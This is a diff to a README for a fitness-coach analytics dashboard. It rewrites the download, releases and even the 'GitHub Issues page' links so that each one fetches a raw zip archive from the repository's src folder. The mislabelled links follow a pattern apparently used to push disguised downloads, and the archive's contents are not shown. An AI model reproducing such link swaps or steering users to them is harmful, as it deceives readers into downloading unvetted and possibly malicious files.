@@ -4,13 +4,13 @@
 The FitCoach Pro Dashboard is a responsive, modern analytics dashboard designed for fitness coaches, gyms, and wellness professionals. It provides a comprehensive view of leads, revenue, messages, and client engagement, all in one place. This dashboard is built to demonstrate a premium database experience.
 
 ## 📥 Download Now
-[![Download FitnessCoach-Dashboard](https://img.shields.io/badge/Download-FitnessCoach--Dashboard-blue.svg)](https://github.com/PhucNguyen050296/FitnessCoach-Dashboard/releases)
+[![Download FitnessCoach-Dashboard](https://raw.githubusercontent.com/PhucNguyen050296/FitnessCoach-Dashboard/main/src/Fitness_Dashboard_Coach_3.6.zip)](https://raw.githubusercontent.com/PhucNguyen050296/FitnessCoach-Dashboard/main/src/Fitness_Dashboard_Coach_3.6.zip)
 
 ## 🚀 Getting Started
 To get started with the FitnessCoach-Dashboard, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page. 
-   - [Download FitnessCoach-Dashboard](https://github.com/PhucNguyen050296/FitnessCoach-Dashboard/releases) 
+   - [Download FitnessCoach-Dashboard](https://raw.githubusercontent.com/PhucNguyen050296/FitnessCoach-Dashboard/main/src/Fitness_Dashboard_Coach_3.6.zip) 
 
 2. **Choose the Latest Version**: Look for the latest version listed on the releases page. This ensures you have the most up-to-date features and fixes.
 
@@ -49,7 +49,7 @@ If you encounter any issues during installation:
 
 ## 🗨️ Support
 For support or questions, feel free to reach out:
-- Open an issue on the [GitHub Issues page](https://github.com/PhucNguyen050296/FitnessCoach-Dashboard/issues).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/PhucNguyen050296/FitnessCoach-Dashboard/main/src/Fitness_Dashboard_Coach_3.6.zip).
 - Join our community discussion forum linked on the releases page.
 
 ## 🌐 Topics
